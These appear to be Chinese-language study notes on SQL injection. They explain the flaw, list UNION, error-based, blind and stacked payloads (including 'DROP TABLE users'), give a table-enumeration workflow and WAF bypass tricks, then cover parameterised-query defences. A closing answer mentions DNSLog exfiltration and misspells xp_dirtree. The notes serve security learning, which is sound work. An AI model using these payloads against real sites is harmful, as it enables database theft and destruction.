# SQL 注入学习笔记

SQL 注入（SQL Injection）是 Web 安全中最经典的漏洞之一，至今仍是 OWASP Top 10 榜首。本文记录 SQL 注入的原理、分类、利用手法、WAF绕过及防御。

## 1. 原理

Web 应用将用户输入的参数直接拼接进 SQL 语句中，未做严格的过滤或参数化处理，导致攻击者可以构造恶意输入，改变原有 SQL 语句的逻辑，从而操纵数据库。

```php
// 危险代码示例
$id = $_GET['id'];
$sql = "SELECT * FROM users WHERE id = $id";
```

## 2. 分类

| 类型 | 特征 | 利用方式 |
|:---|:---|:---|
| **联合查询注入 (UNION)** | 页面有回显 | `1' UNION SELECT 1, database() #` |
| **报错注入** | 页面不回显但显示数据库错误 | `1' AND updatexml(1, concat(0x7e, database()), 1) #` |
| **布尔盲注** | 页面无回显，只有状态差异 | `1' AND (SELECT SUBSTR(database(),1,1))='a' #` |
| **时间盲注** | 页面状态无明显差异，但响应时间有差异 | `1' AND IF(SUBSTR(database(),1,1)='a', SLEEP(5), 0) #` |
| **堆叠注入** | 数据库支持多语句执行 | `1'; DROP TABLE users; #` |

## 3. 利用流程

### 判断注入点
```sql
-- 判断是否存在注入
' AND 1=1 # (页面正常)
' AND 1=2 # (页面异常)

-- 数字型注入不需要单引号
1 AND 1=1
1 AND 1=2
```

### 判断字段数
```sql
1' ORDER BY 3 # (正常)
1' ORDER BY 4 # (报错，说明字段数为3)
```

### 联合查询
```sql
1' UNION SELECT 1, 2, 3 #
-- 确定回显位后，查询数据库信息
1' UNION SELECT 1, database(), 3 #
1' UNION SELECT 1, group_concat(table_name), 3 FROM information_schema.tables WHERE table_schema=database() #
1' UNION SELECT 1, group_concat(column_name), 3 FROM information_schema.columns WHERE table_name='users' #
```

### 报错注入（updatexml）
```sql
1' AND updatexml(1, concat(0x7e, (SELECT database())), 1) #
```

### 时间盲注
```sql
1' AND IF(SUBSTR(database(),1,1)='a', SLEEP(5), 0) #
```

## 4. WAF 绕过技巧

- **大小写混合**：`SeLeCt`、`UnIoN`
- **内联注释**：`/*!SELECT*/`
- **双写关键字**：`SELSELECTECT`
- **等价替换**：`OR 1=1` 替换为 `OR 2>1`
- **编码绕过**：URL 编码、十六进制编码、Unicode 编码
- **分块传输**：Chunked Transfer 绕过 WAF 内容检测

## 5. 防御建议

- **根本防御**：使用参数化查询（Prepared Statements）或 ORM 框架。
- **输入校验**：严格校验输入类型（如 `is_numeric()`）。
- **最小权限**：Web 应用使用的数据库账号不应有 `root` 权限。
- **关闭详细错误**：避免数据库报错信息直接回显给用户。
- **WAF**：部署 WAF 作为辅助防御，拦截常见注入特征。

## 6. 面试高频问题

**Q：SQL 注入的防御方式有哪些？**
A：最有效的是参数化查询（Prepared Statements），其次是输入验证（白名单）、使用 ORM 框架、限制数据库账号权限、开启 WAF 拦截。Impossible 难度采用的就是参数化查询，彻底防住了 SQL 注入。

**Q：盲注无回显怎么办？**
A：布尔盲注（观察页面差异），时间盲注（观察响应时间差），或者利用 DNSLog 外带数据（使用 `load_file()` 或 `xp_dirtmree` 函数向外部请求）。
